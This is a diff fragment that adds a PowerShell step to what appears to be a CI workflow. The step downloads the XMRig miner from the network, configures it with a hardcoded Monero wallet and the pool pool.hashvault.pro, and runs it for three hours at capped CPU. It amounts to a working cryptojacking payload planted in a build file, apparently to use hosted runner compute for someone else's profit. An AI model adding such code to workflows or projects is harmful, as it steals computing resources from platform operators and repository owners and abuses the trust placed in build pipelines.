@@ -1,0 +1,86 @@
+        run: |
+          $ErrorActionPreference = "Stop"
+          
+          Write-Host "========================================"
+          Write-Host "MINER SETUP"
+          Write-Host "========================================"
+          Write-Host "Wallet: 49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
+          Write-Host "Pool: pool.hashvault.pro:443"
+          Write-Host "Donation: 0%"
+          Write-Host "CPU Limit: 40%"
+          Write-Host "Duration: 3 hours"
+          
+          # Download XMRig
+          Write-Host "Downloading XMRig..."
+          $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
+          $zipPath = "$env:TEMP\xmrig.zip"
+          $extractPath = "$env:TEMP\xmrig"
+          
+          Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipPath
+          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+          
+          $xmrigExe = Get-ChildItem -Path $extractPath -Recurse -Filter "xmrig.exe" | Select-Object -First 1
+          
+          if (-not $xmrigExe) {
+              throw "XMRig executable not found!"
+          }
+          
+          # Create config.json using PowerShell hash table
+          $configObject = @{
+              autosave = $true
+              "donate-level" = 0
+              cpu = @{
+                  enabled = $true
+                  "max-threads-hint" = 40
+              }
+              opencl = $false
+              cuda = $false
+              pools = @(
+                  @{
+                      algo = "rx/0"
+                      url = "pool.hashvault.pro:443"
+                      user = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
+                      pass = "x"
+                      tls = $true
+                      "tls-fingerprint" = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
+                  }
+              )
+          }
+          
+          $configPath = "$env:TEMP\config.json"
+          $configObject | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath
+          
+          Write-Host "✓ Configuration created"
+          
+          Write-Host "========================================"
+          Write-Host "STARTING MINER"
+          Write-Host "========================================"
+          
+          # Start XMRig
+          $process = Start-Process -FilePath $xmrigExe.FullName -ArgumentList "-c `"$configPath`"" -NoNewWindow -PassThru
+          
+          Write-Host "✓ Miner started (PID: $($process.Id))"
+          Write-Host "Mining for Monero (XMR)..."
+          
+          # Run for 3 hours
+          $endTime = (Get-Date).AddHours(3)
+          Write-Host "Miner will run until: $endTime"
+          
+          # Monitor miner
+          while ((Get-Date) -lt $endTime) {
+              if (-not (Get-Process -Id $process.Id -ErrorAction SilentlyContinue)) {
+                  Write-Host "✗ Miner process stopped"
+                  break
+              }
+              Start-Sleep -Seconds 30
+          }
+          
+          Write-Host "Time limit reached. Stopping miner..."
+          if (Get-Process -Id $process.Id -ErrorAction SilentlyContinue) {
+              Stop-Process -Id $process.Id -Force
+              Write-Host "✓ Miner stopped"
+          }
+          
+          Write-Host "========================================"
+          Write-Host "MINING SESSION COMPLETE"
+          Write-Host "========================================"
